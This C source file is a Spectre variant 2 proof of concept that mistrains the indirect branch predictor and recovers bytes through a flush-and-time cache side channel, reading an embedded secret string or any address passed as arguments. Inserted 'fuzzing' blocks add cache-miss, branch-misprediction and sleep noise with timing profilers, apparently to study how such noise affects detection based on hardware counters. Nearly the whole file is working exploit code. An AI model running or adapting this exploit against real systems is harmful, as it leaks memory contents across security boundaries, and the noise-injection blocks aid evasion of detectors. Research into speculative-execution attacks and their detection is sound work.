/*
 * Spectre Variant 2 Proof of Concept.
 *
 * The program uses spectre v2 to read its own memory.
 * See the paper for details: https://spectreattack.com/spectre.pdf.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include "common.h"

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif



// >>>>> FUZZING PROFILLING variables init START 
                                      #include <stdlib.h>     // malloc
                                      #include <stdio.h>      // for printf
                                      #include <stddef.h>     // for uint8_t, size_t etc
                                      #include <stdint.h>
                                      #include <time.h>       // For clock()
                                      #include <string.h>     // For memset
                                      #define ANSI_COLOR_RED     "\x1b[31m"
                                      #define ANSI_COLOR_GREEN   "\x1b[32m"
                                      #define ANSI_COLOR_YELLOW  "\x1b[33m"
                                      #define ANSI_COLOR_BLUE    "\x1b[34m"
                                      #define ANSI_COLOR_RESET   "\x1b[0m"
                                      #define LOGI(s, ...) printf("[" ANSI_COLOR_BLUE "INFO" ANSI_COLOR_RESET " ] " s "\n", ##__VA_ARGS__)
                                      #define LOGW(s, ...) printf("[" ANSI_COLOR_YELLOW "WARNG" ANSI_COLOR_RESET "] " s "\n", ##__VA_ARGS__)
                                      #define LOGE(s, ...) printf("[" ANSI_COLOR_RED "ERROR" ANSI_COLOR_RESET "] " s "\n", ##__VA_ARGS__)
                                      #define LOGD(s, ...) printf("[" ANSI_COLOR_GREEN "DEBUG" ANSI_COLOR_RESET "] " s "\n", ##__VA_ARGS__)
                                      #define LOGI_NNL(s, ...) printf("[" ANSI_COLOR_BLUE "INFO" ANSI_COLOR_RESET " ] " s, ##__VA_ARGS__)		// No New Line
                                      #define LOGW_NNL(s, ...) printf("[" ANSI_COLOR_YELLOW "WARNG" ANSI_COLOR_RESET "] " s, ##__VA_ARGS__)	// No New Line
                                      #define LOGE_NNL(s, ...) printf("[" ANSI_COLOR_RED "ERROR" ANSI_COLOR_RESET "] " s, ##__VA_ARGS__)		// No New Line
                                      #define LOGD_NNL(s, ...) printf("[" ANSI_COLOR_GREEN "DEBUG" ANSI_COLOR_RESET "] " s, ##__VA_ARGS__)	// No New Line
                                      
                                      double total_fuzzing_time_ms = 0;
                                      double total_attack_code_time_ms = 0;
                                      // clock_t local_temp_start = 0;  Always reinit to 0 before using
                                      // clock_t local_temp_end = 0;  Always reinit to 0 before using
                                      // double local_temp_start_minus_end_ms = 0; // Always reinit to 0 before using                                      
// >>>>> FUZZING PROFILLING variables init END






#define CACHE_HIT_THRESHOLD 100
#define GAP 512
#define MEASUREMENTS 1000

uint8_t channel[256 * GAP]; // side channel to extract secret phrase
uint64_t *target; // pointer to indirect call target
char *secret = "COSEC{Stealing_data_with_Spectre!}";

// mistrained target of indirect call
int gadget(char *addr)
{
  return channel[*addr * GAP]; // speculative loads fetch data into the cache
}

// safe target of indirect call
int safe_target()
{
  return 42;
}

// function that makes indirect call
// note that addr will be passed to gadget via %rdi
int victim(char *addr, int input)
{
  int junk = 0;
  // set up branch history buffer (bhb) by performing >29 taken branches
  // see https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html
  //   for details about how the branch prediction mechanism works
  // junk and input used to guarantee the loop is actually run
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }

  int result;
  // call *target
  __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (*target)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
  return result & junk;
}

// see appendix C of https://spectreattack.com/spectre.pdf
void readByte(char *addr_to_read, char result[2], int score[2])
{
  int hits[256]; // record number of cache hits
  int tries, i, j, k, mix_i, junk = 0;
  uint64_t start, elapsed;
  uint8_t *addr;
  char dummyChar = '$';

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 1;
  }

  for (tries = MEASUREMENTS; tries > 0; tries--) {


/* Starting timer*/
// >>>>> timer on start 
        clock_t local_temp_start = clock();        
// >>>>> timer on end


////////////////////////////////////////////////////////////////////////////////////
/* **********************  Place to add fuzzing modules  **************************/
///////////////////////////////////////////////////////////////////////////////////


// >>>>> cache_misses fuzz start

            uint8_t *b = (uint8_t*) malloc(6 * 0x100000 * sizeof(uint8_t)); // 0x100000 = 1MB
            uint8_t *s = b;
            uint8_t *d = b + 2 * 0x100000; // 0x100000 = 1MB
            memset(s, 0xA, 71364/*this number is generated by python framework*/);

            // fuzz_simple_lw_sw(s, d, FUZZ_SIMPLE_LW_SW_LEN):
            asm volatile (
                "movq $0, %%rcx\n\t"           // Initialize counter rcx to 0

                "loop_start_2:\n\t"
                "movq (%%rsi, %%rcx, 4), %%rax\n\t" // Load integer from source array. (%%esi, %%rcx, 4) means take value from esi+4*rcx, 4 because each element is uint32_t ie 4B
                "movq %%rax, (%%rdi, %%rcx, 4)\n\t" // Store it into destination array. (dest[rcx])
                
                "incq %%rcx\n\t"                // Increment counter
                "cmpq %[count], %%rcx\n\t"      // Compare counter with count
                "jl loop_start_2\n\t"             // If counter is less, loop

                : // Output operands
                // : "=r" (esi_value) // Output operands
                : [count] "r" ((uint64_t) 71364/*this number is generated by python framework*/), "S" (s), "D" (d) // Input: count, src (esi), dest (edi)
                : "%rax", "%rcx", "memory"  // Clobbered: rax, ecx, and memory to indicate memory is being modified
            );

            for (int i = 0; i < 71364/*this number is generated by python framework*//8/*X86_CACHELINE_SIZE_NUM_OF_B*/; i += 8*8/*X86_CACHELINE_SIZE_NUM_OF_B*/) {
                flush((void *)(s + i));
                flush((void *)(d + i));
            }
            
            free(b);

        
// >>>>> cache_misses fuzz end

// >>>>> br_inst_retired fuzz start
// >>>>> br_inst_retired fuzz end

// >>>>> br_misp_retired fuzz start      
            int mispredict = 0;

            // Assembly block to create frequent branch mispredictions
            __asm__ volatile (
                "movl $0, %%eax\n\t"             // Initialize counter to 0
                "movl $32902, %%ecx\n"            // Loop 1000 times
                "1:\n\t"                         // Label for the loop start
                "cmpl $0, %%eax\n\t"             // Compare counter with 0
                "je 2f\n\t"                      // Jump if equal to label 2
                "jmp 3f\n\t"                     // Jump to label 3
                "2:\n\t"                         // Label 2
                "movl $1, %%eax\n\t"             // Set counter to 1 to alternate path
                "jmp 4f\n\t"                     // Jump to label 4
                "3:\n\t"                         // Label 3
                "movl $0, %%eax\n\t"             // Set counter to 0 to alternate path
                "4:\n\t"                         // Label 4
                "decl %%ecx\n\t"                 // Decrement loop counter
                "jne 1b\n\t"                     // Jump to start of loop if not zero
                : "=a" (mispredict)              // Output: final value of EAX (not used)
                :                                // No input
                : "%ecx"                         // Clobbered register
            );
                        
        
// >>>>> br_misp_retired fuzz end

// >>>>> total_inst_retired fuzz start     
            usleep(34);  // The idea is to fuzz the number of actual instructions
                                // executed per unit time, so sleeping will decrease that


            //asm volatile ("nop");
        
// >>>>> total_inst_retired fuzz end


////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////



/* Stopping timer*/
// >>>>> timer off start 
        clock_t local_temp_end = clock();
        double local_temp_start_minus_end_ms = (double)(local_temp_end - local_temp_start) / CLOCKS_PER_SEC * 1000.0;
        total_fuzzing_time_ms += local_temp_start_minus_end_ms;        
// >>>>> timer off end


    // poison branch target predictor
    *target = (uint64_t)&gadget;
    _mm_mfence();
    for (j = 50; j > 0; j--) {
      junk ^= victim(&dummyChar, 0);
    }
    _mm_mfence();

    // flush side channel
    for (i = 0; i < 256; i++)
      _mm_clflush(&channel[i * GAP]);
    _mm_mfence();

    // change to safe target
    *target = (uint64_t)&safe_target;
    _mm_mfence();

    // flush target to prolong misprediction interval
    _mm_clflush((void*) target);
    _mm_mfence();

    // call victim
    junk ^= victim(addr_to_read, 0);
    _mm_mfence();

    // now, the value of *addr_to_read should be cached even though
    // the logical execution path never calls gadget()

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = __rdtsc();
      junk ^= *addr;
      _mm_mfence(); // make sure read completes before we check the timer
      elapsed = __rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }

    // locate top two results
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || hits[i] >= hits[j]) {
        k = j;
        j = i;
      } else if (k < 0 || hits[i] >= hits[k]) {
        k = i;
      }
    }
    if ((hits[j] >= 2 * hits[k] + 5) ||
        (hits[j] == 2 && hits[k] == 0)) {
      break;
    }
  }

  hits[0] ^= junk; // prevent junk from being optimized out
  result[0] = (char)j;
  score[0] = hits[j];
  result[1] = (char)k;
  score[1] = hits[k];
}

int main(int argc, char *argv[])
{

  sleep(2); 
  target = (uint64_t*)malloc(sizeof(uint64_t));

  char result[2];
  int score[2];
  int len = strlen(secret);
  char *addr = secret;

  if (argc == 3) {
    sscanf(argv[1], "%p", (void **)(&addr));
    sscanf(argv[2], "%d", &len);
  }

  printf("Reading %d bytes starting at %p:\n", len, addr);
  while (--len >= 0) {
    //printf("reading %p...", addr);
// >>>>> FUZZING total attack code profiling 1 start
                                      clock_t time_for_main_attack_code_start = clock();                                      
// >>>>> FUZZING total attack code profiling 1 end
    readByte(addr++, result, score);
    //printf("%s: ", (score[0] >= 2 * score[1] ? "success" : "unclear"));
    //printf("0x%02X='%c'\n", result[0], (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
// >>>>> FUZZING total attack code profiling 2 start
                                      clock_t time_for_main_attack_code_end = clock();
                                      double time_for_main_attack_code_start_minus_end_ms = (double) (time_for_main_attack_code_end - time_for_main_attack_code_start) / CLOCKS_PER_SEC * 1000.0;
                                      total_attack_code_time_ms += time_for_main_attack_code_start_minus_end_ms;                                      
// >>>>> FUZZING total attack code profiling 2 end
    printf("%c", (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
    fflush(stdout);
  }
  printf("\n");

  free(target);
// >>>>> FUZZING total attack code profiling print results start
                                      LOGI("============================== Profilling ==============================");
                                      LOGI("Total fuzzing time (ms)\t\t: %10.4f", total_fuzzing_time_ms);
                                      LOGI("Total attack code time (ms)\t: %10.4f (Including fuzzing time)", total_attack_code_time_ms);
                                      LOGI("Total attack code time (ms)\t: %10.4f (Excluding fuzzing time)", total_attack_code_time_ms - total_fuzzing_time_ms);
                                      LOGI("Overhead in time (ms)\t\t: %10.4f", total_attack_code_time_ms/(total_attack_code_time_ms - total_fuzzing_time_ms));
                                      LOGI("========================================================================");                                      
// >>>>> FUZZING total attack code profiling print results end

  return 0;
}
